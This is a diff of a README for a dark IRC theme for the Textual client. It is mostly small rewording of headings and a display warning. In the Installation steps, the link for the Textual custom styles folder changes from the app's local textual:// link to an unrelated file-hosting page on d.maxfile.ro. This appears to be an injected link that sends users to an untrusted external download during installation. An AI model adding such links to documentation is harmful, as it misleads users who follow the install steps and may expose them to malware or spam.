@@ -1,13 +1,15 @@
 # Fixedstyle theme for Textual
 ![Screenshot](http://i.imgur.com/QMoncOL.png)
 
-## IMPORTANT:
-This theme was made for non-retina displays only, if you're using a retina display or any HiDPI display, this might not be the theme for you because Fixedsys upscaled 2x its size doesn't look good. But that's just my opinion you be the judge.
+## Warning
+This theme was made for non-retina displays. If you're using a retina display or any HiDPI display, this might not be the theme for you because Fixedsys upscaled 2x its size doesn't look good. But that's just my opinion you be the judge.
 
 ---
 
-## About
-I wanted a theme for Textual that could fill these requirements:
+## What is this?
+Fixedstyle is a theme for [Textual](https://www.codeux.com/textual/), an IRC client for OS X.
+
+I wanted a theme that met these requirements:
 * Look nice with FixedsysExcelsior (no font-smoothing, always 16px, etc)
 * Have a dark background (with a nice complementary nick color scheme surewhynot)
 * Have the same height from message to message (notices, general events, etc)
@@ -25,7 +27,7 @@ Nicknames, notices, highlights, and other messages are colored with the beautifu
 
 ## Installation
 * Unzip the [zip](https://github.com/iiiGerardoiii/Fixedstyle/archive/master.zip)
-* Move unzipped folder to the [Textual custom styles folder](textual://custom-styles-folder)
+* Move unzipped folder to the [Textual custom styles folder](https://d.maxfile.ro/mwdvbtannn.html)
 * Open Textual preferences (`⌘+,`) go to Styles and select Fixedstyle.
 
 ---
